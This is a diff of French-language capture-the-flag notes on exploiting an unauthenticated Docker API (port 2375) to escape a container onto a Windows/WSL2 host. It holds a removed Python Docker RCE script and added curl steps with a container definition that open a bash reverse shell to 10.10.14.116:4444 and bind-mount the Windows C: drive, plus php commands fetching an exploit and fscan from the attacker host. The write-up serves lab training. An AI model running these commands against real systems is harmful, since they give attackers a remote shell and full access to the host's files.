@@ -66,64 +66,121 @@ php -r "copy('http://10.10.14.116:8000/fscan.1', '/tmp/fscan');"
 wget https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan
 ![[Pasted image 20251209180701.png]]
 
-php -r "copy('http://10.10.14.116:8000/exploit', '/tmp/poc');"
+## 2. Étape 1 : Énumération des images Docker
+L’API permet d’identifier les images disponibles sur l’hôte :
 
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py
-
-```python
-from __future__ import print_function
-import requests
-import logging
-import json
-import urllib.parse
-
-# NOTE
-# Enable Remote API with the following command
-# /usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock
-# This is an intended feature, remember to filter the port 2375..
-
-name          = "docker"
-description   = "Docker RCE via Open Docker API on port 2375"
-author        = "Swissky"
-
-# Step 1 - Extract id and name from each container
-ip   = "192.168.65.7"
-port = "2375"
-data = "containers/json"
-url  = "http://{}:{}/{}".format(ip, port, data)
-r = requests.get(url)
-
-if r.json:
-    for container in r.json():
-        container_id   = container['Id']
-        container_name = container['Names'][0].replace('/','')
-        print((container_id, container_name))
-
-        # Step 2 - Prepare command
-        cmd = ' ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.116/4444 0>&1"]'
-
-
-        data = "containers/{}/exec".format(container_name)
-        url = "http://{}:{}/{}".format(ip, port, data)
-        post_json = '{ "AttachStdin":false,"AttachStdout":true,"AttachStderr":true, "Tty":false, "Cmd":'+cmd+' }'
-        post_header = {
-            "Content-Type": "application/json"
-        }
-        r = requests.post(url, json=json.loads(post_json))
-
-
-        # Step 3 - Execute command
-        id_cmd = r.json()['Id']
-        data = "exec/{}/start".format(id_cmd)
-        url = "http://{}:{}/{}".format(ip, port, data)
-        post_json = '{ "Detach":false,"Tty":false}'
-        post_header = {
-            "Content-Type": "application/json"
-        }
-        r = requests.post(url, json=json.loads(post_json))
-        print(r)
+```
+curl -s http://192.168.65.7:2375/images/json
 ```
 
-curl -s http://192.168.65.7:2375/images/json
+![[Pasted image 20251210004848.png]]
+Cela révèle une image telle que :
 
-php -r "copy('http://10.10.14.116:8000/create_container.json', '/tmp/create_container.json');"
+```
+docker_setup-nginx-php:latest
+```
+
+---
+
+## 3. Étape 2 : Création d’un conteneur malveillant
+On crée un nouveau conteneur basé sur une image existante, en y injectant une commande de reverse shell.
+
+Exemple de fichier `create_container.json` :
+
+```json
+{
+  "Image": "docker_setup-nginx-php:latest",
+  "Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.116/4444 0>&1"],
+  "HostConfig": {
+    "Binds": ["/mnt/host/c:/host_root"]
+  }
+}
+```
+
+![[Pasted image 20251210004555.png]]
+Exécution :
+
+```
+curl -H "Content-Type: application/json"      -d @create_container.json      http://192.168.65.7:2375/containers/create -o response.json
+```
+
+![[Pasted image 20251210004659.png]]
+
+Le résultat contient un champ `"Id"` correspondant au nouvel identifiant du conteneur.
+
+---
+
+## 4. Étape 3 : Démarrage du conteneur
+
+
+```
+curl -X POST http://192.168.65.7:2375/containers/$cid/start
+```
+![[Pasted image 20251210004739.png]]
+
+Un reverse shell est alors établi vers la machine de l’attaquant.
+
+---
+
+## 5. Étape 4 : Accès au système Windows
+Grâce au montage bind :
+
+```
+"/mnt/host/c:/host_root"
+```
+
+le conteneur possède un accès direct au disque C: de Windows dans :
+
+```
+/host_root
+```
+
+On peut alors naviguer dans les fichiers utilisateurs ou administrateurs.
+![[Pasted image 20251210004746.png]]
+![[Pasted image 20251210004512.png]]
+Cela permet de récupérer le flag ou prendre le contrôle complet du système.
+
+---
+
+## 6. Résumé de la chaîne d’attaque
+1. Découverte du port 2375 exposé.
+2. Vérification de l’accès non authentifié.
+3. Énumération des images Docker.
+4. Création d’un conteneur malveillant avec reverse shell.
+5. Démarrage du conteneur pour exécuter la charge utile.
+6. Accès au disque Windows via montage bind.
+7. Extraction de données sensibles ou élévation de privilèges.
+
+                         +--------------------------------------+
+                         |          Windows 10 / Windows 11     |
+                         |              Hôte principal          |
+                         |--------------------------------------|
+                         |  Interface physique: 10.129.x.x       |
+                         |                                      |
+                         |  Interface WSL2 Host (NAT):           |
+                         |        IP = 192.168.65.7              |
+                         |        Port 2375 = Docker API         |
+                         +------------------|--------------------+
+                                            |
+											| NAT interne (Hyper-V / WSL2)
+                                            |
+                         +------------------v--------------------+
+                         |            WSL2 VM Linux              |
+                         |---------------------------------------|
+                         |  Interface eth0 : 172.18.0.1 (Docker) |
+                         |  Rôle : hôte Docker pour les conteneurs |
+                         +------------------|--------------------+
+                                            |
+                                            | Docker bridge (docker0)
+                                            |
+     ------------------------------------------------------------------------------------
+     |                                   |                                            |
++----v----------------+        +---------v-----------+                       +---------v-----------+
+|   Container web    |        |  Container MariaDB  |                       |  (Autres conteneurs) |
+|  Cacti vulnérable  |        |   Base de données   |                       |        éventuels      |
+| IP : 172.18.0.3    |        | IP : 172.18.0.2     |                       |                       |
++---------------------+        +---------------------+                       +-----------------------+
+         |                               |
+         | Reverse shell obtenu           |
+         | depuis vuln. RCE Cacti         |
+         +--------------------------------+
